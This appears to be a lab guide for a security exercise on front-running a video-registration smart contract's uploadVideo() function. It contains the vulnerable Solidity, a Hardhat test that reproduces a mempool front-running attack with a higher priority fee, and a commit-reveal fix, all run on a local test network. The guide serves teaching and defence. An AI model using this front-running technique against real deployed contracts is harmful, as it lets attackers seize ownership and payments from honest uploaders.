# Scenario 2 - Front-running `uploadVideo()`

> Execution guide. Follow the steps top to bottom. All paths are relative to
> `P2P App/contract/`. Commands are copy-paste ready.

`uploadVideo()` gives permanent ownership of a CID to whoever registers it **first**,
with no proof that the caller owns the content and no way to ever transfer or undo
it. Because the peer-play backend broadcasts `uploadVideo(cid, price)` as a plaintext
transaction to the public mempool (`server.js:192`), an attacker who is watching the
mempool can copy the CID and submit their own `uploadVideo(cid)` with a higher gas
fee, so their transaction is mined first. The honest uploader is permanently locked
out, and the attacker now collects every purchase payment for that video.

## Prerequisites (once)

```bash
cd "P2P App/contract"
npm install
npx hardhat compile
```

This scenario needs a **mempool with more than one pending transaction**, so the test
turns off automining and mines manually. It still runs under `npx hardhat test`
(the in-process Hardhat network orders the mempool by priority fee).

---

## 1. Concepts

- **Mempool** - pending transactions wait here before being included in a block.
  Anyone running a node can read it, so a transaction is public *before* it is mined.
- **Gas-price ordering (EIP-1559)** - when several transactions compete for the same
  block, the node orders them by priority fee (tip); a higher tip is mined earlier.
  Front-running = watch a pending transaction, then send your own with a higher tip
  so it lands first.
- **First-come ownership** - `uploadVideo()` does `require(videos[cid].owner ==
  address(0), "Video already exists")`. The first successful call wins forever;
  there is no transfer, delete, or re-price function.
- **Why the backend makes it worse** - the server signs and broadcasts the upload on
  the user's behalf, leaking the CID in the clear. The attacker doesn't need to break
  the server; they just watch the chain.

---

## 2. Vulnerable code

Create **`contracts/VideoStreamingFrontrunVuln.sol`** - the base upload logic:

```solidity
// Function to upload a new video
function uploadVideo(string memory _ipfsHash, uint256 _price) public {
    require(videos[_ipfsHash].owner == address(0), "Video already exists");

    videos[_ipfsHash] = Video({
        ipfsHash: _ipfsHash,
        owner: msg.sender,
        price: _price,
        isAvailable: true
    });

    emit VideoUploaded(_ipfsHash, msg.sender, _price);
}
```

**Why it's exploitable:** ownership is decided purely by transaction ordering, and
the CID is public in the mempool. Whoever pays the higher tip becomes the owner -
irreversibly.

---

## 3. Attack

No attacker contract is needed - the attacker just sends a competing transaction.
Create **`test/frontrun.attack.test.js`**:

```javascript
const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("Scenario 2 - Front-running (attack on vulnerable contract)", function () {
  it("attacker steals ownership by paying a higher tip", async function () {
    const [deployer, victim, attacker] = await ethers.getSigners();

    const VS = await ethers.getContractFactory("VideoStreamingFrontrunVuln");
    const vs = await VS.deploy();
    await vs.waitForDeployment();

    const cid = "QmVictimOriginalVideo";
    const price = ethers.parseEther("0.1");

    // Stop automining so both transactions sit in the mempool together.
    await ethers.provider.send("evm_setAutomine", [false]);

    // The victim (via the backend) broadcasts the upload - LOW tip.
    const victimTx = await vs.connect(victim).uploadVideo(cid, price, {
      maxPriorityFeePerGas: ethers.parseUnits("1", "gwei"),
      maxFeePerGas: ethers.parseUnits("200", "gwei"),
    });

    // The attacker sees the CID in the mempool and front-runs - HIGH tip.
    const attackerTx = await vs.connect(attacker).uploadVideo(cid, price, {
      maxPriorityFeePerGas: ethers.parseUnits("100", "gwei"),
      maxFeePerGas: ethers.parseUnits("200", "gwei"),
    });

    // Mine one block: the higher-tip attacker tx is ordered first.
    await ethers.provider.send("evm_mine", []);

    const owner = (await vs.videos(cid)).owner;
    console.log("CID:              ", cid);
    console.log("Victim address:   ", victim.address);
    console.log("Attacker address: ", attacker.address);
    console.log("On-chain owner:   ", owner, owner === attacker.address ? "(ATTACKER)" : "");

    // The victim's transaction reverts: the CID is already taken.
    let victimReverted = false;
    try { await victimTx.wait(); } catch (e) { victimReverted = true; }
    console.log("Victim tx reverted:", victimReverted, "(Video already exists)");

    await ethers.provider.send("evm_setAutomine", [true]);

    expect(owner).to.equal(attacker.address);
    expect(victimReverted).to.equal(true);
  });
});
```

### Run it

```bash
npx hardhat test test/frontrun.attack.test.js
```

**Expected output (successful attack):**

```
=== Front-running - direct contract attack ===

VideoStreaming deployed at: 0xe7f1725E7734CE288F8367e1Bb143E90bb3F0512
Victim  : 0x70997970C51812dc3A010C7d01b50e0d17dc79C8
Attacker: 0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC

Victim wants to register CID "QmVictimOriginalVideo" @ 0.1 ETH

Victim broadcast uploadVideo(cid) with tip = 1 gwei (pending in mempool)
Attacker sees the CID and front-runs uploadVideo(cid) with tip = 100 gwei

Mining the mempool (ordered by tip) ...

--- Result ---
On-chain owner of the CID: 0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC (ATTACKER)
Victim tx reverted       : true (Video already exists)

Attack succeeded - the attacker stole ownership of the victim's CID.
The attacker now collects every purchase payment for that video.
```

```
=== Front-running - attack through the API ===

Registered + logged in: victim
Attacker wallet: 0x9965507D1a55bcC2695C58ba16FB37d819B0A4dc (not a custodial account)

Victim calls POST /upload (backend broadcasts uploadVideo to the mempool) ...
Attacker read the pending CID from the mempool: QmVFXbdzcufPEAwKcAnAdphnN93PPLMdD7NWJNWzJvQXyy
Attacker submits uploadVideo(cid) directly with tip = 100 gwei ...

--- Result ---
Victim POST /upload status: 500 (upload failed)
On-chain owner of the CID : 0x9965507D1a55bcC2695C58ba16FB37d819B0A4dc (ATTACKER)

Attack succeeded - the attacker stole the CID through the public mempool.
The victim's upload reverted; the attacker now owns the video on-chain.
```

The attacker owns the victim's CID; the victim is permanently locked out.

> 📸 **Screenshot here (successful attack):** capture the terminal showing
> "On-chain owner: 0x...(ATTACKER)" and "Victim tx reverted: true".
> `![successful attack](../screenshots/2-frontrun-attack.png)`

---

## 4. Mitigation

Bind ownership to the uploader with a **commit-reveal** scheme. The uploader first
publishes a hash that includes *their own address*; only later do they reveal the
CID. A front-runner who copies the reveal cannot match the commitment because it was
computed with the victim's address, not theirs.

Create **`contracts/VideoStreamingFrontrunFixed.sol`**:

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.24;

contract VideoStreamingFrontrunFixed {
    struct Video { string ipfsHash; address owner; uint256 price; bool isAvailable; }

    mapping(string => Video) public videos;
    mapping(bytes32 => uint256) public commitBlock; // commitment => block it was made in

    event VideoCommitted(bytes32 commitment, address committer);
    event VideoUploaded(string ipfsHash, address owner, uint256 price);

    // Step 1: publish keccak256(cid, price, salt, msg.sender). Reveals nothing.
    function commitVideo(bytes32 commitment) public {
        require(commitBlock[commitment] == 0, "Commitment exists");
        commitBlock[commitment] = block.number;
        emit VideoCommitted(commitment, msg.sender);
    }

    // Step 2 (in a later block): reveal. The commitment is rebuilt with msg.sender,
    // so only the original committer can satisfy it.
    function uploadVideo(string memory _ipfsHash, uint256 _price, bytes32 _salt) public {
        bytes32 commitment = keccak256(abi.encodePacked(_ipfsHash, _price, _salt, msg.sender));
        require(commitBlock[commitment] != 0, "No matching commit");
        require(block.number > commitBlock[commitment], "Reveal too early");
        require(videos[_ipfsHash].owner == address(0), "Video already exists");

        videos[_ipfsHash] = Video(_ipfsHash, msg.sender, _price, true);
        emit VideoUploaded(_ipfsHash, msg.sender, _price);
    }
}
```

**What changed and why it works:**
- Ownership now requires a prior `commitVideo()` whose hash bakes in `msg.sender`.
- When the attacker copies the victim's reveal (`cid`, `price`, `salt`), the contract
  recomputes the commitment with the **attacker's** address. That hash was never
  committed, so `require(commitBlock[commitment] != 0, "No matching commit")` reverts.
- The attacker could only win by committing the same CID *earlier* with their own
  address - but the CID is secret until the victim reveals, so they can't.
- `require(block.number > commitBlock[...])` forces commit and reveal into different
  blocks, closing the same-block race.

---

## 5. Failed attack on the fixed code

Create **`test/frontrun.mitigation.test.js`**. The victim commits, then reveals; the
attacker tries to front-run the reveal and fails.

```javascript
const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("Scenario 2 - Front-running (attack blocked by commit-reveal)", function () {
  it("front-run reveal reverts; the victim keeps ownership", async function () {
    const [deployer, victim, attacker] = await ethers.getSigners();

    const VS = await ethers.getContractFactory("VideoStreamingFrontrunFixed");
    const vs = await VS.deploy();
    await vs.waitForDeployment();

    const cid = "QmVictimOriginalVideo";
    const price = ethers.parseEther("0.1");
    const salt = ethers.encodeBytes32String("victim-secret");

    // Commitment is bound to the VICTIM's address.
    const commitment = ethers.solidityPackedKeccak256(
      ["string", "uint256", "bytes32", "address"],
      [cid, price, salt, victim.address]
    );

    // Step 1: victim commits (secret CID not revealed yet).
    await vs.connect(victim).commitVideo(commitment);
    await ethers.provider.send("evm_mine", []); // move to the next block

    // Step 2: victim reveals. The attacker sees it and front-runs with a higher tip.
    await ethers.provider.send("evm_setAutomine", [false]);

    const victimReveal = await vs.connect(victim).uploadVideo(cid, price, salt, {
      maxPriorityFeePerGas: ethers.parseUnits("1", "gwei"),
      maxFeePerGas: ethers.parseUnits("200", "gwei"),
    });
    const attackerReveal = await vs.connect(attacker).uploadVideo(cid, price, salt, {
      maxPriorityFeePerGas: ethers.parseUnits("100", "gwei"),
      maxFeePerGas: ethers.parseUnits("200", "gwei"),
    });

    await ethers.provider.send("evm_mine", []);

    // Attacker's tx is mined first (higher tip) but REVERTS: commitment doesn't match.
    let attackerReverted = false;
    try { await attackerReveal.wait(); } catch (e) { attackerReverted = true; }
    await victimReveal.wait(); // victim's succeeds

    const owner = (await vs.videos(cid)).owner;
    console.log("Attacker front-run reverted:", attackerReverted, "(No matching commit)");
    console.log("On-chain owner:", owner, owner === victim.address ? "(VICTIM)" : "");

    await ethers.provider.send("evm_setAutomine", [true]);

    expect(attackerReverted).to.equal(true);
    expect(owner).to.equal(victim.address);
  });
});
```

### Run it

```bash
npx hardhat test test/frontrun.mitigation.test.js
```

**Expected output (attack fails):**

```
  Scenario 2 - Front-running (attack blocked by commit-reveal)
Attacker front-run reverted: true (No matching commit)
On-chain owner: 0x70997970C51812dc3A010C7d01b50e0d17dc79C8 (VICTIM)
    ✔ front-run reveal reverts; the victim keeps ownership
```

Even though the attacker's transaction is mined first, it reverts, and the victim
retains ownership of their CID.

> 📸 **Screenshot here (failed attack):** capture the terminal showing
> "Attacker front-run reverted: true" and "On-chain owner: 0x...(VICTIM)".
> `![failed attack](../screenshots/2-frontrun-mitigated.png)`
